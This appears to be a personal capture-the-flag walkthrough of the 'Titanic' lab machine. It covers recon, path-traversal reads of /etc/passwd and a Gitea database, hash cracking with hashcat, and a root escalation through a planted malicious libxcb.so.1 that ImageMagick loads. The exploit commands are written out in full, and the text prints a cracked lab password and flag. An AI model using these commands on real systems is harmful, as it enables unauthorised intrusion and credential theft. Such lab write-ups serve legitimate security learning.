# Titanic Lab-Total time 3 days

---

## The first and half of second day I used to recon the machine and website and scripts to use, rest of second day and third i actively looked around the machine for the flags and scripts to use to escalate privileges.

### MARKED AS EASY BUT IT WAS NOT FOR SOMEONE WITH LIMITED KNOWLEDGE

First step was to run nmap scan

```bash
nmap -sS -p- 10.10.11.55 -T5
```

Results:

![image (1).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(1).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/7cd73a4c-1f71-4960-91d2-28890cd5ab96)

I then ran port 80 scan to get more data on it

```bash
nmap -sV -p 80 10.10.11.55 -T5
```

![image (2).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(2).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/c008bdfb-f899-45cb-bc70-a76272d55a04)

I added the IP address to the host list

```bash
sudo nano /etc/hosts/
```

![image (3).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(3).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/102ee87e-95da-4ab9-b3b0-d208fb114f78)

after doing that i ran gobuster scan with common wordlist

```bash
gobuster dir -u http://titanic.htb/ -w /usr/share/wordlists/dirb/common.txt
```

![image (4).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(4).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/594cdd52-a4a8-4765-a508-c758d16c2478)

I visited the website and clicked around, i booked the ticket while checking browser web developer network section and noticed the the address that redirects to the download

![image (5).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(5).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/28cfde2c-54e3-4e78-9514-39b2e506e301)

After numerous types of research I found something called LFI (Local File Intrusion)

I researched common commands used with it and I used #curl

```bash
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

![image (6).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(6).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/ced61489-2261-404b-a8cb-3c008c465f89)

I recorded possible users like root, man, nobody, developer, _laurel

I then tried to check hosts

```bash
curl "http://titanic.htb/download?ticket=../../../../etc/hosts"
```

Found a wildcard for the domain called dev.titanic.htb

![image (7).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(7).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/4f4b51df-bd6b-42b2-92a8-f8450941db9f)

![image (8).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(8).png)

I added the domain to the host list

![image (9).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(9).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/e2f53f34-c393-48bc-9315-4fb7914858c9)

And i ran gobuster again with the new domain added

![image (10).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(10).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/fe7b86c3-442d-4896-bc56-592affc5420f)

I used curl to get data from admin, developer, administrator

and research showed that they are using gitea to host the site and found their repo

Upon reviewing the repo I found they were using #MYSQLas database

![image (11).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(11).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/30aa7b83-0b6b-4cf7-aecf-e432d96d24c6)

and their password

![image (12).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(12).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/3fc1406b-0595-4920-acdb-d93f3370c431)

after researching how gitea sets up in a directory i tried with the previously recorded users which only developer worked.

```bash
curl -s "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

This saved the file with their whole database

I used

```bash
sqlite3 gitea.db
#once opened i ran.tables
```

![image (13).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(13).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/9e02ce8d-43e4-49d8-a33a-6a7f2999c6c3)

I researched how to traverse database and tried multiple commands until i found the working one related to users

```bash
SELECT * FROM user;
```

This showed me the hashed credentials for users

![image (14).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(14).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/bff8929f-5e55-4bc5-9a8e-3fd485ff95dc)

Since we were working in developer i saved developer’s hash in a hash.txt file

I used AI translate the developer hash into sha256 I then used #hashcat

```bash
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --outfile cracked.txt
```

This process took around 2-3 hours I successfully got access to the password for developer

![image (15).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(15).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/67523a9e-cbda-42cf-8bae-b7170ab0fa99)

developer:25282528

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/e1f489fc-58c4-4fe1-a430-14ca56fa7fa5)

using ls i found file named user.txt which contained the flag for user

![image.png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image.png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/5cf4515d-b889-458f-a7f8-7d90c62a2b26)

After several minutes traversing around and looking around for root flag i found the root.txt file in tmp folder but i also figured out that developer did not have sudo power but in my search i found an interesting file that is running a script using magick, after investigating further I found out that Imagemagick was used to escalate privilages and did more research

![image (16).png](Titanic%20Lab-Total%20time%203%20days%201df5b4e7124c809c99a5c47772d9dcc0/image_(16).png)

[image](https://app.capacities.io/eb63b4f1-2b8f-411d-b0fe-a58b0d8c4b97/8a0eafa8-458d-49c5-8279-62af18fe0d7e)

Researching around i found a script that was used with magick i just modified the directories i needed

```bash
cd /tmp
gcc -shared -fPIC -o libxcb.so.1 -x c - << 'EOF'#include <stdlib.h>__attribute__((constructor)) void init() {    system("cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt;");}EOF
```

This command compiles a C program into a shared object (library) named libxcb.so.1.

- **shared**: Instructs gcc to create a shared library (a .so file) rather than an executable.
- **fPIC**: Generates position-independent code, which is required for shared libraries to work correctly across different memory addresses.
- **o libxcb.so.1**: Specifies the output file name as libxcb.so.1.
- **x c**: Tells gcc to treat the input as C code, even though it’s not read from a file with a .c extension.
- **<< ‘EOF’**: Uses a here-document to provide the C code directly from the command line, ending when EOF is encountered.

```bash
mv /tmp/libxcb.so.1 /opt/app/static/assets/images/
```

Moves the compiled libxcb.so.1 from /tmp to /opt/app/static/assets/images/, the working directory of the identify_images.sh script.

By placing libxcb.so.1 in /opt/app/static/assets/images/, you increase the likelihood that ImageMagick loads our malicious library instead of the legitimate libxcb.so.1, triggering the payload.

```bash
cat /etc/crontab
```

Checking /etc/crontab (and possibly /etc/cron.*/*) helps confirm whether identify_images.sh is scheduled to run automatically as root via a cron job. For example, a line like */5*  * * * root /opt/scripts/identify_images.sh would indicate the script runs every 5 minutes as root.

```bash
cat /tmp/root.txt
```

root password : 2a523b982f4c3b11feb62d868bf67fb4